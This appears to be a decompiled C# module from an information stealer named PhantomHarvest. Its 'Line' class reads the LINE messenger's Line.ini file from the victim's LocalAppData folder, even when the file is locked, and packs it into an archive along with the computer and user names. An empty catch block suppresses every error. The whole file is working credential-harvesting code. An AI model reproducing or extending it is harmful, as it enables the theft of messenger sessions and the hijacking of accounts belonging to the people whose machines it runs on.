using System;
using System.IO;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Messengers
{
	// Token: 0x02000015 RID: 21
	internal class Line
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Data/Line.ini");
				if (File.Exists(text))
				{
					byte[] fileBytes = LockedFile.ReadLockedFile(text);
					if (fileBytes != null)
					{
						using (MemoryStream ms = new MemoryStream(fileBytes))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, Line.MessengerName + "/Line.ini", ms, DateTime.Now, "");
						}
					}
					
					string contents = string.Concat(new string[]
					{
						"Computer Name = ",
						Environment.MachineName,
						Environment.NewLine,
						"User Name = ",
						Environment.UserName
					});
					
					using (MemoryStream ms = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(contents)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, Line.MessengerName + "/infp.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string MessengerName = "Line";
	}
}
